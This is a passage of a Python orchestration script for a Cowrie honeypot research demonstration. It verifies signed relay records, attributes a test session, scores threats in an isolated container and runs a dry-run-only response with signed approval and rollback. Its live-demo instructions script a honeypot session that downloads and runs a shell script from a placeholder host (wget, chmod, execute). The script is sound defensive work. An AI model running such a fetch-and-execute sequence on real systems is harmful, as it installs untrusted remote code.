            "feedback_core_sha256": core_hash, "annotation_record_hash": ann["record_hash"], "response_log_verify": vlog,
            "events": [(e["sequence"], e["event"], e["to_state"]) for e in ctl.audit.entries]}


def ts_parse(s):
    return datetime.fromisoformat(s.replace("Z", "+00:00"))


def rules_branch(run, sid, events, relay_lines, relay_pem, relay_pin, now, stop_after_assessment=False):
    keys = {"result": demo_key("attribution_result (DEMO)")}
    if not stop_after_assessment:
        keys["approver"] = demo_key("human_approval (DEMO)")
    addr_rel = "../../work/input/" + f"address_safety_DEMO-{run.id}.json"                 # resolves to /work/input inside the container
    addr, v3, pol, resp = demo_configs(relay_pin, keys["result"], keys.get("approver"), now, addr_rel)
    run.check("DEMO keys are distinct from each other and from the relay key",
              len({relay_pin} | {k["sha"] for k in keys.values()}) == 1 + len(keys))
    names = {"events": f"cowrie_events_DEMO-{run.id}.jsonl", "addr": f"address_safety_DEMO-{run.id}.json", "v3": f"threat_attribution_v3_DEMO-{run.id}.json",
             "pol": f"defence_policy_v2_2_DEMO-{run.id}.json", "pub": f"attribution_result_DEMO-{run.id}.pub.pem", "cal": f"calibration_DEMO-{run.id}.json",
             "signed": f"signed_result_DEMO-{run.id}.json", "wrapper": f"demo_container_wrapper-{run.id}.py"}
    run.write(WORK_IN / names["events"], "\n".join(json.dumps(e) for e in events) + "\n")
    for k, doc in (("addr", addr), ("v3", v3), ("pol", pol)):
        run.write(WORK_IN / names[k], json.dumps(doc, indent=2))
    run.write(WORK_IN / names["pub"], keys["result"]["pem"])
    run.write(WORK_IN / names["cal"], CALIBRATION.read_bytes())
    run.write(WORK_IN / names["wrapper"], CONTAINER_WRAPPER)

    # ---- signed attribution (signer side; DEMO result key in memory)
    cfg = config_from_document(v3)
    corr = correlate(events, relay_lines, relay_pem, cfg, evaluation_time=now)
    st = corr["sessions"].get(sid, {})
    run.check("signed attribution: relay chain verifies", corr["verification"]["ok"], corr["verification"]["reason"])
    run.check("signed attribution: session mapped to the test client", st.get("state") == "attributable_via_proxy_mapping" and st.get("client_ip") == TEST_CLIENT,
              f"{st.get('state')} -> {st.get('client_ip')}")
    result = sign_result(build_result(corr, correlate_authentication(events), cfg, events, now - timedelta(seconds=1), 3600, now,
                                      result_id=f"DEMO-{run.id}"), keys["result"]["key"])
    run.write(WORK_IN / names["signed"], json.dumps(result, indent=2))
    att = AttributionConfig.from_document(v3, address_doc=addr, result_public_key_pem=keys["result"]["pem"])
    try:
        verify_result(json.loads(json.dumps(result)), att, now)
        verified, why = True, "signature and result hash verify with the DEMO result public key"
    except SignedResultError as exc:
        verified, why = False, str(exc)
    run.check("DEMO-signed attribution result verifies in process with the DEMO public key", verified, why)
    run.check("result signer is the DEMO result key (not the relay key)",
              result["signer"]["public_key_sha256"] == keys["result"]["sha"] != relay_pin, result["signer"]["key_id"])
    evidence_match = attribution_matches_evidence(run, sid, result, events, relay_lines)

    # ---- threat scoring in the isolated container (existing compose profile), audit-hooked
    cdir = f"/work/output/demo-{run.id}/assessment"
    cmd = ["docker", "compose", "-f", REPO / "cowrie" / "docker-compose.yml", "--profile", "assessment", "run", "--rm", "-T", "--entrypoint",
           "/cowrie/cowrie-env/bin/python3", "threat-assessment", f"/work/input/{names['wrapper']}", "--repo-root", "/opt/project",
           "--attribution-config", f"/work/input/{names['v3']}", "--policy", f"/work/input/{names['pol']}",
           "--result-public-key", f"/work/input/{names['pub']}", "--calibration", f"/work/input/{names['cal']}",
           "--cowrie-events", f"/work/input/{names['events']}", "--signed-result", f"/work/input/{names['signed']}", "--now", iso(now), "--out-dir", cdir]
    p = run.sh(cmd)
    adir = run.out / "assessment"
    run.check("stage 9 threat scoring ran in the isolated container", p.returncode == 0 and (adir / "summary.json").exists(),
              (p.stderr.strip().splitlines() or ["ok"])[-1] if p.returncode else "ok")
    summary = json.loads((adir / "summary.json").read_text())
    opened_c = json.loads((adir / "opened_files.json").read_text())
    run.check("container isolation self-check ok", summary["isolation"]["ok"] and summary["isolation"]["in_container"])
    loaded = opened_c.get("startup", []) + opened_c.get("assessment", [])
    prod_opened = [f for f in loaded if f.startswith("/opt/project/configs/") or "/secrets/" in f or f.endswith("cowrie.json")]
    demo_loaded = sorted(f for f in loaded if f.startswith("/work/input/"))
    run.check("container loaded no production config (assessment phase)", not prod_opened and len(demo_loaded) >= 6,
              f"loaded {len(demo_loaded)} DEMO inputs from /work/input; production: {prod_opened}")
    run.check("isolation self-check scanned the repository (read-only key scan, not config loading)", len(opened_c.get("isolation_scan", [])) > 0,
              f"{len(opened_c.get('isolation_scan', []))} files scanned")
    assessments = [json.loads(l) for l in (adir / "assessments.jsonl").read_text().splitlines()]
    a = next(x for x in assessments if x["session_ref"] == sid)
    if run.mode == "rehearse":
        run.check("stage 9 tier = propose (gates unchanged)", a["tier"] == "propose" and all(a["gates"].values()), a["tier_reason"])
    else:                                    # real data: record whatever the unchanged assessor decided; never manufacture a proposal
        run.check(f"stage 9 tier recorded as produced by the unchanged assessor: {a['tier']}",
                  (a["tier"] == "propose") == all(a["gates"].values()) == (a["proposed_action"] is not None), a["tier_reason"])
    if a["tier"] == "propose":
        run.check("stage 9 proposal is dry-run, approval pending, not executed",
                  a["proposed_action"]["mode"] == "dry_run" and a["proposed_action"]["manual_approval"] == "pending"
                  and a["proposed_action"]["execution"] == "not_executed")
    run.check("container verified the DEMO-signed result (accepted, none rejected)",
              len(a["versions"]["attribution_results"]["accepted"]) == 1 and not a["versions"]["attribution_results"]["rejected"],
              str(a["versions"]["attribution_results"]["accepted"])[:160])
    evidence = next(json.loads(l) for l in (adir / "evidence.jsonl").read_text().splitlines() if json.loads(l)["session_ref"] == sid)

    # ---- negative checks in-process (same verifier code): altered and unsigned attribution
    policy = PolicyConfig.from_document(pol)
    ecfg = EvidenceConfig(relay_sources=frozenset(att.relay_strings), internal_networks=att.internal_cidr_strings, calibration=load_calibration(CALIBRATION))
    rec = next(r for r in EvidenceEngine(ecfg).evaluate(events)["sessions"] if r["session_ref"] == sid)
    ta = ThreatAssessor(att, policy, ecfg)
    altered = json.loads(json.dumps(result))
    next(e for e in altered["sessions"] if e["cowrie_session_id"] == sid)["client"]["ip"] = "10.250.25.4"
    o_alt = ta.assess(rec, altered, now=now)
    run.check("altered signed attribution is rejected", o_alt["proposed_action"] is None and o_alt["session_attribution"]["state"] != "attributable_via_proxy_mapping",
              str(o_alt["versions"]["attribution_results"]["rejected"])[:160])
    o_uns = ta.assess(rec, corr, now=now)
    run.check("unsigned attribution is rejected (no proposal)", o_uns["proposed_action"] is None and o_uns["session_attribution"]["state"] != "attributable_via_proxy_mapping",
              str(o_uns["versions"]["attribution_results"]["rejected"])[:160])
    base = {"assessment": {k: a[k] for k in ("session_ref", "tier", "tier_reason", "gates", "proposed_action", "successful_login_basis",
                                             "authentication_evidence", "session_attribution", "findings", "caveat_annotations",
                                             "distinct_action_indicators_on_qualifying_findings", "processing_errors", "versions")},
            "behavioural_evidence": evidence, "attribution": {k: st.get(k) for k in ("state", "client_ip", "client_port", "close_check")},
            "signed_result": {k: result[k] for k in ("result_id", "issued_utc", "not_after_utc", "signer", "result_hash")},
            "evidence_match": evidence_match, "container_summary": summary,
            "container_opened_files": {k: len(v) for k, v in opened_c.items()}, "container_demo_inputs_loaded": demo_loaded,
            "keys": {k: {"role": v["role"], "sha256": v["sha"], "label": LABEL} for k, v in keys.items()}}
    if stop_after_assessment:
        return {"stopped": "after signed attribution and threat assessment (no response, no feedback)", **base}
    if run.mode == "assess":
        return {**base, "response": response_demo(run, sid, a, read_log(adir / "audit.jsonl"), adir, att, policy, resp, keys, result, relay_pin)}

    # ---- dynamic response (dry-run) + feedback
    rpol = response_policy_from_document(resp)
    spy_calls = []

    class SpyDisabled(DisabledRelayEnforcement):
        def stage_rule(self, rule):
            spy_calls.append("stage")
            return super().stage_rule(rule)

        def remove_rule(self, rule_id):
            spy_calls.append("remove")
            return super().remove_rule(rule_id)
    audit_path = run.out / "response" / "response_audit.jsonl"
    audit_path.parent.mkdir(parents=True, exist_ok=True)
    ctl = ResponseController(rpol, att, policy, ResponseAuditLog(audit_path), relay=SpyDisabled())
    a_entries = read_log(adir / "audit.jsonl")
    uns_ctl = ResponseController(rpol, att, policy, ResponseAuditLog())
    uns_audit = __import__("threat_assessment").AuditLog("DEMO-unsigned", clock=lambda: iso(now))
    uns_audit.append(o_uns)
    r_uns = uns_ctl.intake(o_uns, uns_audit.entries, now)
    run.check("unsigned attribution cannot authorise a response proposal", not r_uns["accepted"], r_uns["reason"])
    r = ctl.intake(a, a_entries, now)
    run.check("stage 10 intake of the container assessment", r["accepted"], r.get("reason", ""))
    prop = r["proposal"]
    appr = sign_approval(build_approval(prop, "approve", "DEMO APPROVER (ephemeral)", keys["approver"]["sha"][:16], now + timedelta(seconds=1), 600),
                         keys["approver"]["key"])
    run.check("DEMO approval signature verified by the controller", ctl.submit_decision(appr, now + timedelta(seconds=2))["accepted"])
    ex = ctl.execute(prop["proposal_id"], now + timedelta(seconds=3), mode="dry_run")
    run.check("response executed in DRY-RUN only (relay boundary never called)", ex["accepted"] and spy_calls == [], ex["reason"])
    run.check("enforce mode refused", not ctl.execute(prop["proposal_id"], now + timedelta(seconds=3), mode="enforce")["accepted"])
    v = {"verification_id": f"v-{run.id}", "proposal_id": prop["proposal_id"], "kind": "response", "restriction_observed": False,
         "control_unaffected": True, "verified_utc": iso(now + timedelta(seconds=4)), "operator": "DEMO OPERATOR",
         "evidence_ref": f"{'synthetic' if run.mode == 'rehearse' else 'live'}-run-{run.id}", "result": "pass"}
    run.check("operator verification recorded (dry-run: no real effect)", ctl.record_verification(v, now + timedelta(seconds=5))["state"] == "verified_dry_run")
    ctl.revoke(prop["proposal_id"], "DEMO OPERATOR", "end of demonstration", now + timedelta(seconds=6))
    rv = dict(v, verification_id=f"rv-{run.id}", kind="rollback", verified_utc=iso(now + timedelta(seconds=7)))
    run.check("simulated rollback verified", ctl.record_rollback_verification(rv, now + timedelta(seconds=8))["state"] == "rolled_back")
    annotate(ctl.audit, prop["proposal_id"], "DEMO REVIEWER", "true_positive", "synthetic rehearsal" if run.mode == "rehearse" else "live demonstration")
    outs = outcomes(ctl.audit.entries)
    linked = outs.get(prop["proposal_id"], {})
    run.check("feedback linked to the response record", linked.get("labels") and linked["final_state"] == "rolled_back" and linked["response_success"],
              f"proposal {prop['proposal_id']}")
    run.check("response audit log verifies", verify_response_log(ctl.audit.entries, ctl.audit.checkpoint())["ok"])
    fb = {"outcomes": outs, "metrics": metrics(ctl.audit.entries), "review_queue": review_queue(ctl.audit.entries)}
    run.write(run.out / "response" / "feedback.json", json.dumps(fb, indent=2, default=str))
    run.write(run.out / "response" / "proposal.json", json.dumps(prop, indent=2))
    run.write(run.out / "response" / "approval.json", json.dumps(appr, indent=2))
    return {"assessment": {k: a[k] for k in ("session_ref", "tier", "tier_reason", "gates", "proposed_action", "successful_login_basis")},
            "attribution": {k: st.get(k) for k in ("state", "client_ip", "client_port", "close_check")}, "proposal_id": prop["proposal_id"],
            "rule": {k: appr["rule"][k] for k in ("rule_id", "target", "ttl_seconds", "expires_utc")}, "feedback": fb["metrics"],
            "container_opened_files": {k: len(v) for k, v in opened_c.items()}, "container_demo_inputs_loaded": demo_loaded, "keys": {k: {"role": v["role"], "sha256": v["sha"], "label": LABEL} for k, v in keys.items()}}


# ============================================================================================ orchestration
def guard_opened(run, allowed_live=()):
    """No production config, private key, live Cowrie log, Dataset V2 or sealed data may have been opened by this process."""
    def bad(p):
        q = p.replace("\\", "/").lower()
        return any(s in q for s in ("/configs/", "/secrets/", "cowrie.json", "ml_pipeline/work", "dataset_v2", "sealed", "/data/raw/")) and \
            not any(q.endswith(a.lower()) for a in allowed_live)
    offenders = sorted({p for p in OPENED if bad(p)})
    run.check("this process opened no production config, private key, Cowrie log, Dataset V2 or sealed data", not offenders, str(offenders[:5]))
    return offenders


def cleanup(run, keep_dir):
    """Copy evidence to the report folder, then delete ONLY what this run created."""
    keep_dir.mkdir(parents=True, exist_ok=True)
    if run.out.exists():
        shutil.copytree(run.out, keep_dir / "artifacts", dirs_exist_ok=True)
    for p in run.created:
        if p.exists() and p.is_file() and (p.parent == WORK_IN or run.out in p.parents):
            shutil.copy2(p, keep_dir / "artifacts" / ("input_" + p.name)) if p.parent == WORK_IN else None
    removed = []
    for p in run.created:
        if p.parent == WORK_IN and p.exists():
            p.unlink()
            removed.append(str(p.relative_to(REPO)))
    if run.out.exists() and run.out.parent == WORK_OUT and run.out.name.startswith("demo-"):
        shutil.rmtree(run.out)
        removed.append(str(run.out.relative_to(REPO)) + "/ (this run's output directory)")
    run.check("cleanup removed only this run's artifacts; scratch folders restored",
              sorted(p.name for p in WORK_IN.iterdir()) == run.pre_input and sorted(p.name for p in WORK_OUT.iterdir()) == run.pre_output
              and WORK_IN.is_dir() and WORK_OUT.is_dir(), f"{len(removed)} paths removed")
    return removed


def main(argv=None):
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("mode", choices=("rehearse", "live", "assess", "print-live-commands"))
    ap.add_argument("--evidence-run", help="assess: preserved live run folder name under live/ (its captured slice is the input)")
    ap.add_argument("--demo-session-exception", help=f"assess only: the single registered demo session allowed through ({DEMO_EXCEPTION_SID})")
    ap.add_argument("--with-response", action="store_true", help="assess only: continue to the DRY-RUN dynamic response and feedback")
    ap.add_argument("--cowrie-baseline", type=int)
    ap.add_argument("--relay-baseline", type=int)
    ap.add_argument("--approved", action="store_true", help="required for live mode (a fresh session was separately approved)")
    ap.add_argument("--keep-workdir", action="store_true")
    ap.add_argument("--ml-only", action="store_true", help="run the ML branch only (no signing, threat scoring, response or feedback)")
    ap.add_argument("--cowrie-rotated-to", help="live: name of the rotated log if Cowrie's daily rotation happened after the baseline")
    ap.add_argument("--not-before", help="live: UTC time recorded before the session was generated; every slice event must be at or after it")
    a = ap.parse_args(argv)
    if a.with_response and a.mode != "assess":
        raise SystemExit("--with-response is only valid in assess mode")
    if a.mode == "print-live-commands":
        print(LIVE_COMMANDS)
        return 0
    hashes_before = {k: sha_file(p) for k, p in WATCHED.items()}
    run = Run(a.mode)
    now = datetime.now(timezone.utc)
    print(f"=== DEMO run {run.id} ({a.mode}) - {LABEL}")
    if a.mode == "rehearse":
        relay = demo_key("relay_record (DEMO, synthetic fixture only)")
        sid, events, relay_lines = synthetic_fixture(now, relay)
        relay_pem, relay_pin, allowed = relay["pem"], relay["sha"], ()
        run.check("synthetic session ID is fresh and not excluded", sid not in EXCLUDED, sid)
    elif a.mode == "assess":
        if not (a.approved and a.evidence_run):
            raise SystemExit("assess mode needs --approved and --evidence-run")
        sid, events, relay_lines, relay_pem, relay_pin, slice_info = evidence_inputs(run, a.evidence_run, a.demo_session_exception)
        allowed = ("cowrie/attributing_relay/relay_mapping_ed25519.pub.pem", "cowrie/attributing_relay/records/relay_mapping.jsonl",
                   "configs/session_exclusions_v2.json")
    else:
        if a.demo_session_exception:
            raise SystemExit("--demo-session-exception is only valid in assess mode")
        if not (a.approved and a.cowrie_baseline is not None and a.relay_baseline is not None):
            raise SystemExit("live mode needs --approved, --cowrie-baseline and --relay-baseline")
        sid, events, relay_lines, relay_pem, relay_pin, slice_info = live_inputs(run, a.cowrie_baseline, a.relay_baseline, a.not_before, a.cowrie_rotated_to)
        allowed = ("cowrie/attributing_relay/relay_mapping_ed25519.pub.pem", "cowrie/attributing_relay/records/relay_mapping.jsonl")
    if a.mode == "assess":
        ml = {"skipped": f"assess mode: the ML branch already ran in {a.evidence_run} and is not repeated"}
    else:
        raw = run.write(run.out / "raw" / "cowrie_slice.json", "\n".join(json.dumps(e) for e in events) + "\n")
        print("--- ML branch")
        ml = ml_branch(run, raw)
    if a.mode == "assess":
        print("--- Rules branch" + (" + DRY-RUN response and feedback" if a.with_response else " (stops after threat assessment)"))
        rules = {"relay_record_verification": relay_test_client_check(run, sid, events, relay_lines, slice_info["relay_baseline"], relay_pem)}
        rules.update(rules_branch(run, sid, events, relay_lines, relay_pem, relay_pin, now, stop_after_assessment=not a.with_response))
    elif a.ml_only:
        rules = {"skipped": "--ml-only: no signing, threat scoring, response or feedback was run"}
        if a.mode == "live":
            rules["relay_record_verification"] = relay_test_client_check(run, sid, events, relay_lines, a.relay_baseline, relay_pem)
    else:
        print("--- Rules branch")
        mark = len(OPENED)
        rules = rules_branch(run, sid, events, relay_lines, relay_pem, relay_pin, now)
        ml_dir = str(run.out / "ml").replace("\\", "/").lower()
        ml_reads = [p for p in OPENED[mark:] if p.replace("\\", "/").lower().startswith(ml_dir)]
        run.check("branches independent: rules branch opened no ML-branch output (input = Cowrie events + relay records only)", not ml_reads,
                  f"{len(OPENED) - mark} files opened during the rules branch, {len(ml_reads)} under ml/")
    cowrie_cmds = [c for c in run.subprocess_cmds if "cowrie-project" in " ".join(c)]
    run.check("the live Cowrie container was touched only by the read-only slice exec" if a.mode == "live" else
              "no command touched the live Cowrie container in this mode",
              len(cowrie_cmds) == (1 if a.mode == "live" else 0) and all(c[:3] == ["docker", "exec", "cowrie-project"] for c in cowrie_cmds))
    if a.mode in ("live", "assess"):
        summary_extra = {"cowrie_slice": slice_info}
    if a.mode == "assess":
        summary_extra["demo_session_exception"] = slice_info.pop("demo_session_exception")
        ex_after = load_exclusions()
        run.check("global exclusions still active after the run (session excluded for datasets/training/evaluation)",
                  ex_after.is_excluded(sid) and ex_after.version == "2.0.0" and sha_file(REPO / "configs" / "session_exclusions_v2.json")
                  == summary_extra["demo_session_exception"]["exclusions_file_sha256"], f"{ex_after.version} {ex_after.digest[:16]}")
    guard_opened(run, allowed)
    hashes_after = {k: sha_file(p) for k, p in WATCHED.items()}
    run.check("parse_logs.py / extract_features.py unchanged", hashes_before == hashes_after)
    keep = HERE / {"rehearse": "rehearsal", "live": "live", "assess": "assessment"}[a.mode] / run.id
    summary = {"run_id": run.id, "mode": a.mode, "label": LABEL, "session_id": sid, "excluded_ids_untouched": sid not in EXCLUDED,
               "ml_branch": ml, "rules_branch": rules, "hashes_before": hashes_before, "hashes_after": hashes_after,
               "subprocess_commands": run.subprocess_cmds, "files_created": [str(p.relative_to(REPO)) for p in run.created],
               "argv": sys.argv[1:], "started_utc": iso(now)}
    if a.mode in ("live", "assess"):
        summary.update(summary_extra)
    removed = [] if a.keep_workdir else cleanup(run, keep)
    summary["removed"] = removed
    summary["checks"] = run.checks
    keep.mkdir(parents=True, exist_ok=True)
    (keep / "run_summary.json").write_text(json.dumps(summary, indent=2, default=str), encoding="utf-8")
    (keep / "opened_files_host.json").write_text(json.dumps(sorted(set(OPENED)), indent=1), encoding="utf-8")
    failed = [c for c in run.checks if not c["pass"]]
    print(f"=== {len(run.checks) - len(failed)}/{len(run.checks)} checks passed; evidence: {keep.relative_to(REPO)}")
    return 1 if failed else 0


def live_inputs(run, cowrie_baseline, relay_baseline, not_before=None, rotated_to=None):
    """LIVE (approved fresh session only): only Cowrie lines with index >= the boundary leave the container (earlier lines are
    skipped inside it, never copied); the relay log (public, signed records) is read whole for chain verification.
    If Cowrie's daily rotation renamed the log after the baseline (`rotated_to`), the rotated file is only COUNTED inside the
    container (it must still hold exactly `cowrie_baseline` lines, i.e. nothing was appended to it) and the new log is read from line 0."""
    log_dir = "/cowrie/cowrie-git/var/log/cowrie/"
    start = 0 if rotated_to else cowrie_baseline
    rot = ""
    if rotated_to:
        if "/" in rotated_to or not rotated_to.startswith("cowrie.json."):
            raise SystemExit("--cowrie-rotated-to must be a rotated file name such as cowrie.json.2026-11-11")
        rot = ("import os\nr=%r\nsys.stderr.write('ROTATED_LINES=%%d ROTATED_MTIME=%%d ' %% (sum(1 for _ in open(r,'rb')), os.stat(r).st_mtime))\n"
               % (log_dir + rotated_to))
    code = ("import sys\n" + rot + "n=%d\nt=0\nfor i,l in enumerate(open('%scowrie.json')):\n    t=i+1\n"
            "    i>=n and sys.stdout.write(l)\nsys.stderr.write('TOTAL_LINES=%%d' %% t)" % (start, log_dir))
    p = run.sh(["docker", "exec", "cowrie-project", "/cowrie/cowrie-env/bin/python3", "-c", code])
    total = int(p.stderr.strip().rsplit("TOTAL_LINES=", 1)[1]) if "TOTAL_LINES=" in p.stderr else None
    events = [json.loads(l) for l in p.stdout.splitlines() if l.strip()]
    sids = sorted({e["session"] for e in events})
    rotation = None
    if rotated_to:
        kv = dict(x.split("=") for x in p.stderr.split() if x.startswith("ROTATED_"))
        rotation = {"rotated_file": rotated_to, "rotated_lines": int(kv.get("ROTATED_LINES", -1)),
                    "rotated_mtime_utc": iso(datetime.fromtimestamp(int(kv.get("ROTATED_MTIME", 0)), timezone.utc))}
        run.check("rotated log still holds exactly the baseline lines and predates the session (nothing appended to it)",
                  rotation["rotated_lines"] == cowrie_baseline and (not not_before or rotation["rotated_mtime_utc"] < not_before),
                  f"{rotated_to}: {rotation['rotated_lines']} lines, last modified {rotation['rotated_mtime_utc']}")
    run.check("Cowrie slice = exactly the lines appended after the baseline", p.returncode == 0 and total is not None and len(events) == total - start,
              f"baseline {cowrie_baseline}{' (then rotated; new log read from line 0)' if rotated_to else ''}, current log {total} lines, "
              f"slice {len(events)} lines (indices {start}..{(total or 0) - 1})")
    run.check("slice contains exactly one session, not excluded", len(sids) == 1 and not (set(sids) & EXCLUDED), str(sids))
    if not_before:
        early = [e["timestamp"] for e in events if e["timestamp"] < not_before]
        run.check("every slice event is at or after the pre-session time", not early, f"not-before {not_before}; {len(early)} earlier")
    relay_lines = (REPO / "cowrie" / "attributing_relay" / "records" / "relay_mapping.jsonl").read_text(encoding="utf-8").splitlines()
    run.check("relay log grew past its boundary", len(relay_lines) > relay_baseline, f"{relay_baseline} -> {len(relay_lines)}")
    pem = (REPO / "cowrie" / "attributing_relay" / "relay_mapping_ed25519.pub.pem").read_bytes()
    pin = hashlib.sha256(serialization.load_pem_public_key(pem).public_bytes(serialization.Encoding.Raw, serialization.PublicFormat.Raw)).hexdigest()
    shell = [s for s in sids if any(e["session"] == s and e["eventid"] == "cowrie.command.input" for e in events)]
    if not shell:
        raise SystemExit("no shell session in the slice")
    info = {"cowrie_baseline": cowrie_baseline, "cowrie_lines_after": total, "slice_events": len(events), "sessions": sids,
            "first_event_utc": min(e["timestamp"] for e in events), "last_event_utc": max(e["timestamp"] for e in events),
            "eventids": sorted({e["eventid"] for e in events}), "not_before": not_before, "rotation": rotation,
            "slice_sha256": hashlib.sha256(p.stdout.encode("utf-8")).hexdigest()}
    return shell[0], events, relay_lines, pem, pin, info


def relay_test_client_check(run, sid, events, relay_lines, relay_baseline, pem):
    """Relay-record VERIFICATION only (real relay public key): the new records are validly signed and chained, and the fresh
    session's relay connection came from the test client. Nothing is signed; no attribution result is produced."""
    from client_attribution.records import load_public_key, verify_records
    key, pin = load_public_key(pem)
    v = verify_records(relay_lines, key, pin)
    new = [json.loads(l) for l in relay_lines[relay_baseline:]]
    uport = next((e.get("src_port") for e in events if e["session"] == sid and e["eventid"] == "cowrie.session.connect"), None)
    opens = [r for r in new if r.get("record_type") == "connection_open"]
    match = [r for r in opens if r.get("upstream_local_port") == uport]
    run.check("relay records verify with the real relay PUBLIC key (chain + signatures)", v.get("ok"), v.get("reason"))
    run.check("new relay connections are from the test client only (10.250.25.3; control client unused)",
              opens and all(r.get("client_ip") == TEST_CLIENT for r in new if "client_ip" in r),
              f"{len(new)} new records: " + ", ".join(f"{r['record_type']}:{r.get('client_ip')}" for r in new))
    run.check("fresh session's Cowrie source port matches the test client's relay connection", len(match) == 1,
              f"src_port {uport} -> {match[0].get('client_ip') if match else None}")
    return {"relay_public_key_sha256": pin, "verify_ok": v.get("ok"), "verify_reason": v.get("reason"), "relay_lines_after": len(relay_lines),
            "new_records": [{k: r.get(k) for k in ("seq", "record_type", "client_ip", "client_port", "upstream_local_port", "connection_id",
                                                   "accepted_utc", "closed_utc")} for r in new]}


def demo_session_exception(sids, requested):
    """Task 29D: the ONLY way an excluded session may pass, and only in assess mode. It matches exactly DEMO_EXCEPTION_SID,
    requires that ID to be explicitly requested, requires it to be registered as a demo session in the global exclusions,
    and refuses every other excluded session. It never changes the global exclusions (dataset builders, training,
    validation and evaluation keep excluding it). Returns the manifest record; raises SystemExit otherwise."""
    excluded = set(sids) & EXCLUDED
    if not excluded:
        return None
    if requested is None:
        raise SystemExit(f"excluded session(s) {sorted(excluded)}: refused (no demonstration exception requested)")
    if requested != DEMO_EXCEPTION_SID:
        raise SystemExit(f"--demo-session-exception {requested!r} refused: only {DEMO_EXCEPTION_SID} can be named")
    if excluded != {DEMO_EXCEPTION_SID}:
        raise SystemExit(f"excluded session(s) {sorted(excluded - {DEMO_EXCEPTION_SID})} refused: the exception covers {DEMO_EXCEPTION_SID} only")
    ex = load_exclusions()
    if not ex.is_excluded(DEMO_EXCEPTION_SID) or ex.categories.get(DEMO_EXCEPTION_SID) != "demo":
        raise SystemExit(f"{DEMO_EXCEPTION_SID} is not registered as a demo session in the global exclusions; refused")
    return {"session_id": DEMO_EXCEPTION_SID, "scope": "demonstration only: behavioural evidence, demo-signed attribution, threat assessment "
            "(dry-run response/feedback only after separate approval)", "authorised": "Task 29D, 2026-11-12",
            "global_exclusions_unchanged": {"version": ex.version, "digest": ex.digest, "still_excluded": True},
            "exclusions_file_sha256": sha_file(REPO / "configs" / "session_exclusions_v2.json"),
            "not_applicable_to": ["dataset construction", "model training", "validation", "evaluation", "benchmark experiments"]}


def evidence_inputs(run, evidence_run, requested_exception):
    """ASSESS: the input is the Cowrie slice captured and hash-manifested by an earlier live run (no new session, no re-read of
    the live Cowrie log). The relay log (public, signed records) is read whole for chain verification."""
    d = HERE / "live" / evidence_run
    if d.parent != HERE / "live" or not d.is_dir():
        raise SystemExit(f"evidence run {evidence_run!r} not found under live/")
    manifest = dict(reversed(l.split(" *", 1)) for l in (d / "SHA256SUMS").read_text(encoding="utf-8").splitlines() if " *" in l)
    slice_path = d / "artifacts" / "raw" / "cowrie_slice.json"
    want, got = manifest.get("./artifacts/raw/cowrie_slice.json"), sha_file(slice_path)
    run.check("captured slice matches the evidence manifest hash", want == got, got)
    prior = json.loads((d / "run_summary.json").read_text(encoding="utf-8"))
    events = [json.loads(l) for l in slice_path.read_text(encoding="utf-8").splitlines() if l.strip()]
    sids = sorted({e["session"] for e in events})
    run.check("captured slice holds exactly the recorded session", sids == [prior["session_id"]] and len(events) == prior["cowrie_slice"]["slice_events"],
              f"{sids}, {len(events)} events")
    record = demo_session_exception(sids, requested_exception)
    run.check("demonstration exception: exact ID, explicitly requested, registered demo session, global exclusion untouched",
              record is not None and record["session_id"] == sids[0], json.dumps(record)[:200] if record else "no exception needed")
    refused = []
    for other in sorted(EXCLUDED - {DEMO_EXCEPTION_SID}):
        for req in (other, DEMO_EXCEPTION_SID, None):
            try:
                demo_session_exception([other], req)
            except SystemExit:
                refused.append((other, req))
    try:
        demo_session_exception([DEMO_EXCEPTION_SID], "aaaaaaaaaaaa")
    except SystemExit:
        refused.append((DEMO_EXCEPTION_SID, "aaaaaaaaaaaa"))
    run.check("exception refuses every other excluded session and any other requested ID", len(refused) == 3 * (len(EXCLUDED) - 1) + 1,
              f"{len(refused)} refusals over the other {len(EXCLUDED) - 1} excluded IDs")
    relay_lines = (REPO / "cowrie" / "attributing_relay" / "records" / "relay_mapping.jsonl").read_text(encoding="utf-8").splitlines()
    pem = (REPO / "cowrie" / "attributing_relay" / "relay_mapping_ed25519.pub.pem").read_bytes()
    pin = hashlib.sha256(serialization.load_pem_public_key(pem).public_bytes(serialization.Encoding.Raw, serialization.PublicFormat.Raw)).hexdigest()
    rb = int(prior["argv"][prior["argv"].index("--relay-baseline") + 1])
    info = {"evidence_run": evidence_run, "slice_sha256": got, "slice_events": len(events), "sessions": sids, "relay_baseline": rb,
            "relay_lines_now": len(relay_lines), "demo_session_exception": record}
    return sids[0], events, relay_lines, pem, pin, info


LIVE_COMMANDS = """LIVE DEMONSTRATION (run only after separate approval):
 1. boundary:   docker exec cowrie-project /cowrie/cowrie-env/bin/python3 -c "print(sum(1 for _ in open('/cowrie/cowrie-git/var/log/cowrie/cowrie.json')))"
                 python -c "print(sum(1 for _ in open('cowrie/attributing_relay/records/relay_mapping.jsonl')))"   (relay boundary)
                 record the UTC time as <T0>; repeat both counts to confirm they are stable
 2. session:    docker exec cowrie-demo-test-client /cowrie/cowrie-env/bin/python3 /opt/demo/demo_client.py shell --host 10.250.25.2 --port 2222 \\
                   --line "uname -a" --line "wget http://files.example/x.sh -O x.sh" --line "chmod +x x.sh" --line "./x.sh"
                 (test client 10.250.25.3 only; never the control client)
 3. run (ML):   python reports/academic_demo_readiness_20261112/demo_orchestrator.py live --ml-only --cowrie-baseline <N> --relay-baseline <M> --not-before <T0> --approved
    run (full): same without --ml-only (adds DEMO-signed attribution, threat scoring, dry-run response, feedback) - separate approval
 4. afterwards: register the new session ID in a new session-exclusions version (v1 is unchanged)."""


if __name__ == "__main__":
    sys.exit(main())
